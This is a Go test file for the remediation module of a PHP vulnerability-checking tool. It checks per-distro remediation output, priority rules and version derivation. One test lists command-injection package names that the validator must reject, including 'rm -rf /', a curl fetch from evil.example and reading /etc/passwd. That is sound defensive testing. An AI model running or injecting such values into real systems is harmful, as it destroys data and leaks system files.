package remediate_test

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/yehezkiel1086/php2shell-check/internal/advisory"
	"github.com/yehezkiel1086/php2shell-check/internal/inventory"
	"github.com/yehezkiel1086/php2shell-check/internal/match"
	"github.com/yehezkiel1086/php2shell-check/internal/remediate"
)

func mustLoadSeedAdvisory(t *testing.T) advisory.Advisory {
	t.Helper()
	adv, err := advisory.LoadEmbedded()
	if err != nil {
		t.Fatalf("LoadEmbedded() failed: %v", err)
	}
	return adv
}

func readGolden(t *testing.T, name string) string {
	t.Helper()
	p := filepath.Join("..", "..", "testdata", "remediate", name)
	data, err := os.ReadFile(p)
	if err != nil {
		t.Fatalf("read golden file %s: %v", name, err)
	}
	return strings.ReplaceAll(string(data), "\r\n", "\n")
}

func TestGoldenRemediationByDistroFamily(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	tests := []struct {
		name       string
		inst       inventory.PHPInstall
		verdict    match.Verdict
		fixedIn    string
		goldenFile string
	}{
		{
			name: "Debian FPM package",
			inst: inventory.PHPInstall{
				BinaryPath:      "/usr/sbin/php-fpm8.3",
				UpstreamVersion: "8.3.35",
				PackageManager:  "deb",
				PackageName:     "php8.3-fpm",
				PackageVersion:  "8.3.35-1+deb12u1",
				Distro:          inventory.Distro{ID: "debian", VersionID: "12"},
				SAPI:            inventory.SAPIFPM,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictLikelyVulnerable,
			fixedIn:    "8.3.36",
			goldenFile: "debian_fpm.golden",
		},
		{
			name: "RHEL Apache module on 8.5",
			inst: inventory.PHPInstall{
				ModulePath:      "/usr/lib64/httpd/modules/libphp.so",
				UpstreamVersion: "8.5.11",
				PackageManager:  "rpm",
				PackageName:     "php",
				PackageVersion:  "8.5.11-1.el9",
				Distro:          inventory.Distro{ID: "rocky", VersionID: "9.4"},
				SAPI:            inventory.SAPIApache2Handler,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictVulnerable,
			fixedIn:    "8.5.12",
			goldenFile: "rhel_apache.golden",
		},
		{
			name: "Alpine CLI package",
			inst: inventory.PHPInstall{
				BinaryPath:      "/usr/bin/php82",
				UpstreamVersion: "8.2.34",
				PackageManager:  "apk",
				PackageName:     "php82-cli",
				PackageVersion:  "8.2.34-r0",
				Distro:          inventory.Distro{ID: "alpine", VersionID: "3.20.3"},
				SAPI:            inventory.SAPICLI,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictLikelyVulnerable,
			fixedIn:    "8.2.35",
			goldenFile: "alpine_cli.golden",
		},
		{
			name: "Container FPM install",
			inst: inventory.PHPInstall{
				BinaryPath:      "/usr/local/sbin/php-fpm",
				UpstreamVersion: "8.4.26",
				SAPI:            inventory.SAPIFPM,
				Source:          inventory.SourceImage,
			},
			verdict:    match.VerdictVulnerable,
			fixedIn:    "8.4.27",
			goldenFile: "container_fpm.golden",
		},
		{
			name: "cPanel EOL 7.4 FPM install",
			inst: inventory.PHPInstall{
				BinaryPath:      "/opt/cpanel/ea-php74/root/usr/sbin/php-fpm",
				UpstreamVersion: "7.4.33",
				PackageManager:  "rpm",
				PackageName:     "ea-php74-php-fpm",
				SAPI:            inventory.SAPIFPM,
				Source:          inventory.SourceLocal,
			},
			verdict:    match.VerdictLikelyVulnerable,
			fixedIn:    "",
			goldenFile: "cpanel_eol.golden",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			finding := match.Finding{
				AdvisoryID: adv.ID,
				CVEs:       adv.CVEs,
				Install:    tc.inst,
				Verdict:    tc.verdict,
				FixedIn:    tc.fixedIn,
			}
			rec := remediate.Build(finding, adv, remediate.Options{})
			got := remediate.FormatText(rec)
			want := readGolden(t, tc.goldenFile)
			if got != want {
				t.Fatalf("FormatText mismatch vs %s\ngot:\n%s\nwant:\n%s", tc.goldenFile, got, want)
			}
		})
	}
}

func TestMaliciousPackageNameIsRejectedAndNeverRendered(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	maliciousNames := []string{
		"php; rm -rf /",
		"php$(whoami)",
		"php`id`",
		"php && curl evil.example/sh",
		"php|cat /etc/passwd",
		"-oProxyCommand=evil",
		"PHP8.3-UPPERCASE",
		"",
	}

	for _, badPkg := range maliciousNames {
		t.Run(badPkg, func(t *testing.T) {
			t.Parallel()
			err := remediate.ValidatePackageToken(badPkg)
			if !errors.Is(err, remediate.ErrUnsafePackageToken) {
				t.Fatalf("ValidatePackageToken(%q) error = %v, want ErrUnsafePackageToken", badPkg, err)
			}

			if badPkg == "" {
				return
			}

			finding := match.Finding{
				AdvisoryID: adv.ID,
				CVEs:       adv.CVEs,
				Install: inventory.PHPInstall{
					BinaryPath:      "/usr/bin/php",
					UpstreamVersion: "8.3.35",
					PackageManager:  "deb",
					PackageName:     badPkg,
					Distro:          inventory.Distro{ID: "debian", VersionID: "12"},
					SAPI:            inventory.SAPIFPM,
					Source:          inventory.SourceLocal,
				},
				Verdict: match.VerdictVulnerable,
				FixedIn: "8.3.36",
			}

			rec := remediate.Build(finding, adv, remediate.Options{})
			if len(rec.Commands) != 0 {
				t.Fatalf("expected 0 commands when package name is malicious (%q), got: %+v", badPkg, rec.Commands)
			}
			for _, cmd := range rec.Commands {
				if strings.Contains(cmd.Text, badPkg) {
					t.Fatalf("malicious package name %q was rendered into command: %q", badPkg, cmd.Text)
				}
			}
		})
	}
}

func TestPriorityRulesAndUnknownVerdict(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)

	webSAPIs := []inventory.SAPI{
		inventory.SAPIApache2Handler,
		inventory.SAPIFPM,
		inventory.SAPICGI,
		inventory.SAPILiteSpeed,
		inventory.SAPIFrankenPHP,
	}

	for _, sapi := range webSAPIs {
		f := match.Finding{
			Install: inventory.PHPInstall{UpstreamVersion: "8.3.35", SAPI: sapi},
			Verdict: match.VerdictVulnerable,
			FixedIn: "8.3.36",
		}
		rec := remediate.Build(f, adv, remediate.Options{})
		if rec.Priority != remediate.PriorityP0 {
			t.Errorf("web SAPI %q Priority = %s, want P0", sapi, rec.Priority)
		}
	}

	cliFinding := match.Finding{
		Install: inventory.PHPInstall{UpstreamVersion: "8.3.35", SAPI: inventory.SAPICLI},
		Verdict: match.VerdictLikelyVulnerable,
		FixedIn: "8.3.36",
	}
	cliRec := remediate.Build(cliFinding, adv, remediate.Options{})
	if cliRec.Priority != remediate.PriorityP2 {
		t.Errorf("CLI SAPI Priority = %s, want P2", cliRec.Priority)
	}

	unknownFinding := match.Finding{
		Install: inventory.PHPInstall{BinaryPath: "/usr/bin/php-custom", SAPI: inventory.SAPIFPM},
		Verdict: match.VerdictUnknown,
	}
	unknownRec := remediate.Build(unknownFinding, adv, remediate.Options{})
	if unknownRec.Priority != remediate.PriorityP3 {
		t.Errorf("UNKNOWN verdict Priority = %s, want P3", unknownRec.Priority)
	}
	stepsJoined := strings.Join(unknownRec.Steps, "\n")
	if !strings.Contains(stepsJoined, "verify manually") {
		t.Errorf("UNKNOWN verdict steps missing 'verify manually': %s", stepsJoined)
	}
}

func TestDynamicHighestFixedInDerivationNeverHardcoded(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)
	tBool := true
	adv.Branches = append(adv.Branches, advisory.BranchAdvisory{
		Branch:               "8.6",
		FixedIn:              "8.6.4",
		UpstreamFixAvailable: &tBool,
	})

	eolFinding := match.Finding{
		Install: inventory.PHPInstall{UpstreamVersion: "8.1.30", SAPI: inventory.SAPIFPM},
		Verdict: match.VerdictLikelyVulnerable,
	}

	rec := remediate.Build(eolFinding, adv, remediate.Options{})
	stepsJoined := strings.Join(rec.Steps, "\n")
	if !strings.Contains(stepsJoined, "8.6 (>= 8.6.4)") {
		t.Fatalf("expected dynamically derived target '8.6 (>= 8.6.4)', got:\n%s", stepsJoined)
	}
}

func TestHuntHintsIncludedWhenEnabled(t *testing.T) {
	t.Parallel()

	adv := mustLoadSeedAdvisory(t)
	finding := match.Finding{
		Install: inventory.PHPInstall{UpstreamVersion: "8.3.35", SAPI: inventory.SAPIFPM},
		Verdict: match.VerdictVulnerable,
		FixedIn: "8.3.36",
	}

	rec := remediate.Build(finding, adv, remediate.Options{IncludeHuntHints: true})
	stepsJoined := strings.Join(rec.Steps, "\n")

	for _, want := range []string{
		"php2shell-",
		"PHP_SESSION_UPLOAD_PROGRESS",
		remediate.HuntDisclaimer,
	} {
		if !strings.Contains(stepsJoined, want) {
			t.Errorf("hunt hints missing %q\ngot:\n%s", want, stepsJoined)
		}
	}
}
